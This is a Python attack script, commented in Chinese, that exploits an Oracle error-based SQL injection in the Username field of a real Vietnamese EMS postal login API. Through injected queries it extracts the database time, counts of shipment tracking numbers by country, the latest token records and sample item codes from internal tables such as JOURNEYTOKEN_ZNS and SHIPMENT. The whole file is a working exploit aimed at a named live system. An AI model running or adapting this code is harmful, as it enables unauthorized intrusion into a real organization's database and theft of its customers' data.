#!/usr/bin/env python3
"""
最终全面复查 - 确保没有遗漏
"""

import requests
import json
import time

class FinalRecheck:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def final_check(self):
        """最终全面检查"""
        print("=" * 80)
        print("🔍 最终全面复查（2025-10-11）")
        print("=" * 80)
        
        # 1. 当前时间
        print(f"\n{'='*80}")
        print("⏰ 数据库当前时间")
        print(f"{'='*80}")
        
        current_time = self.extract_via_error("SELECT TO_CHAR(SYSDATE,'YYYY-MM-DD HH24:MI:SS') FROM DUAL")
        current_date = self.extract_via_error("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
        
        print(f"  时间: {current_time}")
        print(f"  日期: {current_date}")
        
        time.sleep(1)
        
        # 2. JOURNEYTOKEN表详细统计
        print(f"\n{'='*80}")
        print("📊 JOURNEYTOKEN_ZNS表详细统计")
        print(f"{'='*80}")
        
        queries_journey = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}'"),
            ("独立ITEMCODE", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}'"),
            ("E开头", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%'"),
            ("EMS格式E*VN", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%VN'"),
            ("E*CN（中国）", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%CN'"),
            ("E*KR（韩国）", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%KR'"),
            ("E*US（美国）", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%US'"),
            ("其他格式", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE NOT LIKE 'E%'"),
        ]
        
        results = {}
        
        for name, query in queries_journey:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
                results[name] = int(result)
            time.sleep(1)
        
        # 3. 其他表检查
        print(f"\n{'='*80}")
        print("📋 其他表的EMS运单号")
        print(f"{'='*80}")
        
        other_tables = [
            ("E1E2_PH", "MABC", "NGAY"),
            ("E1E2_PH_TEMP_DATA2_LOG", "MABC", "NGAY"),
            ("SHIPMENT", "CODE", "CREATE_DATE"),
            ("API_CALL_LOG", "ITEMCODE", "CALL_TIME"),
            ("PARTNER_MCS_WEBHOOK", "TRACKING_CODE", "AMND_DATE"),
        ]
        
        for table, code_field, date_field in other_tables:
            # 尝试不同的日期格式
            for date_format in [current_date, current_date[:6]]:
                query = f"SELECT COUNT(DISTINCT {code_field}) FROM EMS.{table} WHERE {date_field} LIKE '{date_format}%' AND {code_field} LIKE 'E%VN'"
                result = self.extract_via_error(query)
                
                if result and result != '0':
                    print(f"  {table}: {result} 个")
                    break
                
                time.sleep(0.5)
        
        # 4. 最新记录检查
        print(f"\n{'='*80}")
        print("🔄 数据更新检查（最新10条记录）")
        print(f"{'='*80}")
        
        print("\n  JOURNEYTOKEN最新记录的日期:")
        for i in range(1, 11):
            query = f"SELECT TOKENDATE FROM (SELECT TOKENDATE, ROWNUM AS RN FROM EMS.JOURNEYTOKEN_ZNS ORDER BY ROWNUM DESC) WHERE RN={i}"
            result = self.extract_via_error(query)
            if result:
                print(f"    {i}. {result}")
            time.sleep(0.3)
        
        # 5. 最终汇总
        print(f"\n{'='*80}")
        print("✅ 最终统计汇总")
        print(f"{'='*80}")
        
        ems_vn = results.get('EMS格式E*VN', 0)
        ems_cn = results.get('E*CN（中国）', 0)
        ems_kr = results.get('E*KR（韩国）', 0)
        ems_us = results.get('E*US（美国）', 0)
        
        print(f"\n  日期: {current_date}")
        print(f"  时间: {current_time}")
        print(f"\n  🎯 EMS运单号统计（去重后）:")
        print(f"     ├─ 越南(E*VN): {ems_vn} 个 ⭐")
        print(f"     ├─ 中国(E*CN): {ems_cn} 个")
        print(f"     ├─ 韩国(E*KR): {ems_kr} 个")
        print(f"     └─ 美国(E*US): {ems_us} 个")
        print(f"\n  📊 总计: {ems_vn + ems_cn + ems_kr + ems_us} 个国际运单")
        
        # 6. 样本验证
        print(f"\n{'='*80}")
        print("🔍 随机样本验证（确保数据真实性）")
        print(f"{'='*80}")
        
        sample_positions = [1, 100, 500, 1000, 2000, 4000, 8000]
        
        for pos in sample_positions:
            query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{current_date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM={pos}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  位置 {pos}: {result}")
            
            time.sleep(0.5)
        
        return ems_vn
    
    def run(self):
        print("\n🔌 连接中...")
        if not self.inject("admin"):
            print("❌ 失败")
            return
        print("✅ 成功\n")
        
        final_count = self.final_check()
        
        print("\n" + "=" * 80)
        print(f"🎉 最终确认: {final_count} 个EMS运单号（去重后）")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = FinalRecheck(target_url)
    checker.run()
